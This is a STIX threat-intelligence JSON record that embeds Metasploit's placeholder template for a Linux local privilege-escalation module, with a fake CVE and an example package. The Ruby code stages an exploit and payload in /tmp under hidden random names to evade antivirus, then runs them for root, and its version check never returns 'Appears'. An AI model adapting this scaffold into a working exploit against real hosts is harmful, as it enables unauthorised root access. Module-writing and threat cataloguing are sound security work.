{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9152f98-d4e2-49d0-8df2-0a0f6c0fec0a",
    "created": "2024-08-14T16:33:19.528759Z",
    "modified": "2024-08-14T16:33:19.528763Z",
    "name": "Sample Linux Priv Esc",
    "description": " This exploit module illustrates how a vulnerability could be exploited in an linux command for priv esc.  'License' => MSF_LICENSE # The place to add your name/handle and email.  Twitter and other contact info isn't handled here. # Add reference to additional authors, like those creating original proof of concepts or # reference materials. # It is also common to comment in who did what (PoC vs metasploit module, etc)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/example_linux_priv_esc.rb",
            "external_id": "example_linux_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.example.com"
        },
        {
            "source_name": "CVE",
            "external_id": "1978-1234"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# This exploit sample shows how an exploit module could be written to exploit\n# a bug in a command on a linux computer for priv esc.\n#\n###\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html\n\n  # includes: is_root?\n  include Msf::Post::Linux::Priv\n  # includes: has_gcc?\n  include Msf::Post::Linux::System\n  # includes: kernel_release\n  include Msf::Post::Linux::Kernel\n  # includes writable?, upload_file, upload_and_chmodx, exploit_data\n  include Msf::Post::File\n  # includes generate_payload_exe\n  include Msf::Exploit::EXE\n  # includes register_files_for_cleanup\n  include Msf::Exploit::FileDropper\n  # includes: COMPILE option, live_compile?, upload_and_compile\n  # strip_comments\n  include Msf::Post::Linux::Compile\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        # The Name should be just like the line of a Git commit - software name,\n        # vuln type, class. Preferably apply\n        # some search optimization so people can actually find the module.\n        # We encourage consistency between module name and file name.\n        'Name' => 'Sample Linux Priv Esc',\n        'Description' => %q{\n          This exploit module illustrates how a vulnerability could be exploited\n          in an linux command for priv esc.\n        },\n        'License' => MSF_LICENSE,\n        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.\n        # Add reference to additional authors, like those creating original proof of concepts or\n        # reference materials.\n        # It is also common to comment in who did what (PoC vs metasploit module, etc)\n        'Author' => [\n          'h00die <mike@stcyrsecurity.com>', # msf module\n          'researcher' # original PoC, analysis\n        ],\n        'Platform' => [ 'linux' ],\n        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but the exploit\n        # may only apply to say ARCH_PPC or something else, where a specific arch is required.\n        # A full list is available in lib/msf/core/payload/uuid.rb\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        # What types of sessions we can use this module in conjunction with.  Most modules use libraries\n        # which work on shell and meterpreter, but there may be a nuance between one of them, so best to\n        # test both to ensure compatibility.\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access\n        # since privilege escalation modules typically result in elevated privileges, this is\n        # generally set to true\n        'Privileged' => true,\n        'References' => [\n          [ 'OSVDB', '12345' ],\n          [ 'EDB', '12345' ],\n          [ 'URL', 'http://www.example.com'],\n          [ 'CVE', '1978-1234']\n        ],\n        'DisclosureDate' => '2023-11-29',\n        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.\n        # It's generally easiest just to put the default at the beginning of the list and skip this\n        # entirely.\n        'DefaultTarget' => 0,\n        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    # force exploit is used to bypass the check command results\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    # Check the kernel version to see if its in a vulnerable range\n    release = kernel_release\n    if Rex::Version.new(release.split('-').first) > Rex::Version.new('4.14.11') ||\n       Rex::Version.new(release.split('-').first) < Rex::Version.new('4.0')\n      return CheckCode::Safe(\"Kernel version #{release} is not vulnerable\")\n    end\n    vprint_good \"Kernel version #{release} appears to be vulnerable\"\n\n    # Check the app is installed and the version, debian based example\n    package = cmd_exec('dpkg -l example | grep \\'^ii\\'')\n    if package&.include?('1:2015.3.14AR.1-1build1')\n      CheckCode::Appears(\"Vulnerable app version #{package} detected\")\n    end\n    CheckCode::Safe(\"app #{package} is not vulnerable\")\n  end\n\n  #\n  # The exploit method drops a payload file to the system, then either compiles and runs\n  # or just runs the exploit on the system.\n  #\n  def exploit\n    # Check if we're already root\n    if !datastore['ForceExploit'] && is_root?\n      fail_with Failure::None, 'Session already has root privileges. Set ForceExploit to override'\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, strip_comments(exploit_data('example.c'))\n      rm_f \"#{executable_path}.c\"\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('example')\n    end\n\n    # register the file for automatic cleanup\n    register_files_for_cleanup(executable_path)\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n    # register payload for automatic cleanup\n    register_files_for_cleanup(payload_path)\n\n    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the\n    # output from the exploit being run, they can optionally see it\n    timeout = 30\n    print_status 'Launching exploit...'\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{executable_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-11-29",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}